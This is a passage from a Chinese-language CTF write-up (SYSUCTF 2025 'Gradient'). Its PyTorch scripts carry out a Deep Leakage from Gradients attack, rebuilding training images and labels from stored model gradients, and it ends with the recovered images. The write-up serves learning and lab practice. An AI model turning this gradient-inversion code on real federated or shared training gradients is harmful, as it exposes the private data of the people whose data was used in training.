class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># r1cknet_grad_attack.py</span></span><br><span class=\"line\"><span class=\"comment\"># 单独训练某个样本</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn.functional <span class=\"keyword\">as</span> F</span><br><span class=\"line\"><span class=\"keyword\">from</span> model <span class=\"keyword\">import</span> R1ckNet</span><br><span class=\"line\"><span class=\"keyword\">from</span> utils <span class=\"keyword\">import</span> label_to_onehot, cross_entropy_for_onehot</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\">parser = argparse.ArgumentParser(description=<span class=\"string\">&#x27;Deep Leakage from Gradients using R1ckNet.&#x27;</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--grad&#x27;</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">str</span>, required=<span class=\"literal\">True</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;Path to the .grad file&#x27;</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--out&#x27;</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">str</span>, default=<span class=\"literal\">None</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;Path to save recovered image&#x27;</span>)</span><br><span class=\"line\">args = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">device = torch.device(<span class=\"string\">&quot;cuda&quot;</span> <span class=\"keyword\">if</span> torch.cuda.is_available() <span class=\"keyword\">else</span> <span class=\"string\">&quot;cpu&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Running on&quot;</span>, device)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1. 加载原始梯度</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(args.grad, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    origin_grad = torch.load(f)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. 初始化模型并加载已有权重</span></span><br><span class=\"line\"><span class=\"comment\">#net = R1ckNet().to(device)</span></span><br><span class=\"line\"><span class=\"comment\">#这个也可以不用注释掉，就是和后面导入模型有点重复</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加载模型的state_dict</span></span><br><span class=\"line\">net = torch.load(<span class=\"string\">r&quot;E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\model.pth&quot;</span>, </span><br><span class=\"line\">                 map_location=device,weights_only=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">net.<span class=\"built_in\">eval</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3. 初始化 dummy 数据和标签</span></span><br><span class=\"line\">dummy_data = torch.ones((<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>), device=device, requires_grad=<span class=\"literal\">True</span>)</span><br><span class=\"line\"><span class=\"comment\"># 之前迭代损失很高就是因为没读懂提示，原来提示的作用是为了让初始化图像时尽可能接近恢复出的图像，这样就能降低损失。在比较少的迭代次数也能有效恢复。</span></span><br><span class=\"line\"><span class=\"comment\"># 图片背景是白色，初始化为全白图像，即采用 torch.ones。</span></span><br><span class=\"line\"><span class=\"comment\"># 之前一直模仿论文代码写的是 torch.rands，训练恢复的效果就很差。</span></span><br><span class=\"line\">dummy_label = torch.randn((<span class=\"number\">1</span>, <span class=\"number\">100</span>), device=device, requires_grad=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 LBFGS 优化器</span></span><br><span class=\"line\">optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class=\"line\">history = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 4. 迭代优化以恢复图像和标签</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> it <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">300</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">closure</span>():</span><br><span class=\"line\">        optimizer.zero_grad()</span><br><span class=\"line\">        <span class=\"comment\"># 进行前向传播获取预测结果</span></span><br><span class=\"line\">        pred = net(dummy_data)</span><br><span class=\"line\">        <span class=\"comment\">#print(f&quot;Prediction shape: &#123;pred.shape&#125;&quot;)  # 打印预测结果的形状</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 使用 softmax 转换标签为概率分布</span></span><br><span class=\"line\">        soft_label = F.softmax(dummy_label, dim=-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 计算交叉熵损失</span></span><br><span class=\"line\">        loss = cross_entropy_for_onehot(pred, soft_label)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 计算损失对模型参数的梯度</span></span><br><span class=\"line\">        grads = torch.autograd.grad(loss, net.parameters(), create_graph=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 计算恢复梯度与原始梯度之间的差异</span></span><br><span class=\"line\">        diff = <span class=\"built_in\">sum</span>(((g_rec - g_orig) ** <span class=\"number\">2</span>).<span class=\"built_in\">sum</span>() <span class=\"keyword\">for</span> g_rec, g_orig <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(grads, origin_grad))</span><br><span class=\"line\">        diff.backward()  <span class=\"comment\"># 反向传播计算差异的梯度</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> diff</span><br><span class=\"line\"></span><br><span class=\"line\">    optimizer.step(closure)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> it % <span class=\"number\">10</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        loss_val = closure().item()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Iter <span class=\"subst\">&#123;it:3d&#125;</span> | Loss: <span class=\"subst\">&#123;loss_val:<span class=\"number\">.4</span>f&#125;</span>&quot;</span>)</span><br><span class=\"line\">        history.append(dummy_data[<span class=\"number\">0</span>].detach().cpu())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 5. 可视化中间恢复图像</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">12</span>, <span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, img <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(history[:<span class=\"number\">30</span>]):</span><br><span class=\"line\">    plt.subplot(<span class=\"number\">3</span>, <span class=\"number\">10</span>, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">    plt.imshow(img.permute(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>).clip(<span class=\"number\">0</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">    plt.title(<span class=\"string\">f&quot;it=<span class=\"subst\">&#123;i * <span class=\"number\">10</span>&#125;</span>&quot;</span>)</span><br><span class=\"line\">    plt.axis(<span class=\"string\">&#x27;off&#x27;</span>)</span><br><span class=\"line\">plt.tight_layout()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 自动命名图像文件</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> args.out:</span><br><span class=\"line\">    plt.savefig(args.out)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    grad_filename = os.path.splitext(os.path.basename(args.grad))[<span class=\"number\">0</span>]  <span class=\"comment\"># 提取不带扩展名的文件名</span></span><br><span class=\"line\">    out_path = <span class=\"string\">f&quot;<span class=\"subst\">&#123;grad_filename&#125;</span>.png&quot;</span></span><br><span class=\"line\">    plt.savefig(out_path)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Image saved to <span class=\"subst\">&#123;out_path&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 6. 输出恢复标签</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> torch.no_grad():</span><br><span class=\"line\">    final_probs = F.softmax(dummy_label, dim=-<span class=\"number\">1</span>)</span><br><span class=\"line\">    recovered_class = torch.argmax(final_probs, dim=-<span class=\"number\">1</span>).item()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Recovered class label:&quot;</span>, recovered_class)</span><br><span class=\"line\"><span class=\"comment\"># 这个标签有大用，之前看到输出结果一直以为是迭代过程中一个比较突出的数值，还是学得太粗略了。</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># model.py</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">R1ckNet</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, in_channels=<span class=\"number\">3</span>, conv1_out=<span class=\"number\">12</span>, conv2_out=<span class=\"number\">12</span>, conv3_out=<span class=\"number\">12</span>,</span></span><br><span class=\"line\"><span class=\"params\">                 conv4_out=<span class=\"number\">16</span>, fc_in=<span class=\"number\">1024</span>, num_classes=<span class=\"number\">100</span></span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.body = nn.Sequential(</span><br><span class=\"line\">            nn.Conv2d(in_channels, conv1_out, <span class=\"number\">5</span>, stride=<span class=\"number\">2</span>, padding=<span class=\"number\">2</span>),</span><br><span class=\"line\">            nn.Sigmoid(),</span><br><span class=\"line\">            nn.Conv2d(conv1_out, conv2_out, <span class=\"number\">5</span>, stride=<span class=\"number\">2</span>, padding=<span class=\"number\">2</span>),</span><br><span class=\"line\">            nn.Sigmoid(),</span><br><span class=\"line\">            nn.Conv2d(conv2_out, conv3_out, <span class=\"number\">5</span>, stride=<span class=\"number\">1</span>, padding=<span class=\"number\">2</span>),</span><br><span class=\"line\">            nn.Sigmoid(),</span><br><span class=\"line\">            nn.Conv2d(conv3_out, conv4_out, <span class=\"number\">3</span>, stride=<span class=\"number\">1</span>, padding=<span class=\"number\">1</span>),</span><br><span class=\"line\">            nn.Sigmoid(),</span><br><span class=\"line\">            nn.Flatten()</span><br><span class=\"line\">        )</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.fc = nn.Linear(fc_in, num_classes)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, x</span>):</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.body(x)</span><br><span class=\"line\">        x = x.view(x.size(<span class=\"number\">0</span>),-<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 展平这一步很重要，规范张量的形状以和权重矩阵的形状相匹配。感觉自己学习代码还是挺粗线条的💦💦💦</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">self</span>.fc(x)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># utils.py</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn.functional <span class=\"keyword\">as</span> F</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 整数形式的分类标签转换为 One-Hot 编码。</span></span><br><span class=\"line\"><span class=\"comment\"># dummy_label是可导的，转换one-hot方便计算和预测结果之间的损失</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">label_to_onehot</span>(<span class=\"params\">target, num_classes=<span class=\"number\">100</span></span>):</span><br><span class=\"line\">    target = torch.unsqueeze(target, <span class=\"number\">1</span>)  <span class=\"comment\"># [B,1]</span></span><br><span class=\"line\">    onehot = torch.zeros(target.size(<span class=\"number\">0</span>), num_classes, device=target.device)</span><br><span class=\"line\">    onehot.scatter_(<span class=\"number\">1</span>, target, <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> onehot</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算预测结果与 one-hot 标签之间的交叉熵损失。</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cross_entropy_for_onehot</span>(<span class=\"params\">pred, target</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> torch.mean(torch.<span class=\"built_in\">sum</span>(- target * F.log_softmax(pred, dim=-<span class=\"number\">1</span>), dim=<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># batch.py 批量训练梯度</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn.functional <span class=\"keyword\">as</span> F</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> model <span class=\"keyword\">import</span> R1ckNet</span><br><span class=\"line\"><span class=\"keyword\">from</span> utils <span class=\"keyword\">import</span> cross_entropy_for_onehot</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm  <span class=\"comment\"># 用于显示进度条</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 配置参数</span></span><br><span class=\"line\">GRAD_DIR = <span class=\"string\">r&quot;E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\grads_origin&quot;</span></span><br><span class=\"line\">MODEL_PATH = <span class=\"string\">r&quot;E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\model.pth&quot;</span></span><br><span class=\"line\">OUT_DIR = <span class=\"string\">r&quot;E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\outputs1&quot;</span></span><br><span class=\"line\">os.makedirs(OUT_DIR, exist_ok=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设备选择</span></span><br><span class=\"line\">device = torch.device(<span class=\"string\">&quot;cuda&quot;</span> <span class=\"keyword\">if</span> torch.cuda.is_available() <span class=\"keyword\">else</span> <span class=\"string\">&quot;cpu&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Running on&quot;</span>, device)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加载模型</span></span><br><span class=\"line\">net = torch.load(MODEL_PATH, map_location=device,weights_only=<span class=\"literal\">False</span>)</span><br><span class=\"line\">net.<span class=\"built_in\">eval</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历所有 .grad 文件</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> grad_file <span class=\"keyword\">in</span> <span class=\"built_in\">sorted</span>(os.listdir(GRAD_DIR)):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> grad_file.endswith(<span class=\"string\">&quot;.grad&quot;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">    grad_path = os.path.join(GRAD_DIR, grad_file)</span><br><span class=\"line\">    out_name = os.path.splitext(grad_file)[<span class=\"number\">0</span>] + <span class=\"string\">&quot;.png&quot;</span></span><br><span class=\"line\">    out_path = os.path.join(OUT_DIR, out_name)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 加载原始梯度</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(grad_path, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        origin_grad = torch.load(f)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 初始化 dummy 数据和标签</span></span><br><span class=\"line\">    dummy_data = torch.ones((<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>), device=device, requires_grad=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    dummy_label = torch.randn((<span class=\"number\">1</span>, <span class=\"number\">100</span>), device=device, requires_grad=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class=\"line\">    history = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 迭代优化</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> it <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">closure</span>():</span><br><span class=\"line\">            optimizer.zero_grad()</span><br><span class=\"line\">            pred = net(dummy_data)</span><br><span class=\"line\">            soft_label = F.softmax(dummy_label, dim=-<span class=\"number\">1</span>)</span><br><span class=\"line\">            loss = cross_entropy_for_onehot(pred, soft_label)</span><br><span class=\"line\">            grads = torch.autograd.grad(loss, net.parameters(), create_graph=<span class=\"literal\">True</span>)</span><br><span class=\"line\">            diff = <span class=\"built_in\">sum</span>(((g_rec - g_orig) ** <span class=\"number\">2</span>).<span class=\"built_in\">sum</span>() <span class=\"keyword\">for</span> g_rec, g_orig <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(grads, origin_grad))</span><br><span class=\"line\">            diff.backward()</span><br><span class=\"line\">            <span class=\"keyword\">return</span> diff</span><br><span class=\"line\"></span><br><span class=\"line\">        optimizer.step(closure)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> it %<span class=\"number\">10</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            loss_val = closure().item()</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Iter <span class=\"subst\">&#123;it:3d&#125;</span> | Loss: <span class=\"subst\">&#123;loss_val:<span class=\"number\">.4</span>f&#125;</span>&quot;</span>)</span><br><span class=\"line\">            history.append(dummy_data[<span class=\"number\">0</span>].detach().cpu())</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 保存图像</span></span><br><span class=\"line\">    plt.figure(figsize=(<span class=\"number\">12</span>, <span class=\"number\">8</span>))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i, img <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(history[:<span class=\"number\">30</span>]):</span><br><span class=\"line\">        plt.subplot(<span class=\"number\">3</span>, <span class=\"number\">10</span>, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        plt.imshow(img.permute(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>).clip(<span class=\"number\">0</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">        plt.title(<span class=\"string\">f&quot;it=<span class=\"subst\">&#123;i * <span class=\"number\">10</span>&#125;</span>&quot;</span>)</span><br><span class=\"line\">        plt.axis(<span class=\"string\">&#x27;off&#x27;</span>)</span><br><span class=\"line\">    plt.tight_layout()</span><br><span class=\"line\">    plt.savefig(out_path)</span><br><span class=\"line\">    plt.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 输出标签（可选）</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> torch.no_grad():</span><br><span class=\"line\">        final_probs = F.softmax(dummy_label, dim=-<span class=\"number\">1</span>)</span><br><span class=\"line\">        recovered_class = torch.argmax(final_probs, dim=-<span class=\"number\">1</span>).item()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;grad_file&#125;</span> -&gt; Class: <span class=\"subst\">&#123;recovered_class&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>然后就能预测图像了。</p>\n<p>注意预测过程中，有些图像会因为迭代次数过大而“矫枉过正”，所以针对某些损失依旧很大的图像可以适当降低迭代次数，单独进行训练。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504223254918.png\"\n                      alt=\"image-20250504223254918\"\n                ></p>\n<p>最后恢复出了的图像如下：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"3.png\"\n                      alt=\"3\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"1.png\"\n                      alt=\"1\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"2.png\"\n                      alt=\"2\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"31.png\"\n                      alt=\"31\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"32.png\"\n                      alt=\"32\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"4.png\"\n                      alt=\"4\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"5.png\"\n                      alt=\"5\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"6.png\"\n                      alt=\"6\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"7.png\"\n                      alt=\"7\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"8.png\"\n                      alt=\"8\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"9.png\"\n                      alt=\"9\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"10.png\"\n                      alt=\"10\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"11.png\"\n                      alt=\"11\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"12.png\"\n                      alt=\"12\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"13.png\"\n                      alt=\"13\" style=\"zoom:25%;\" 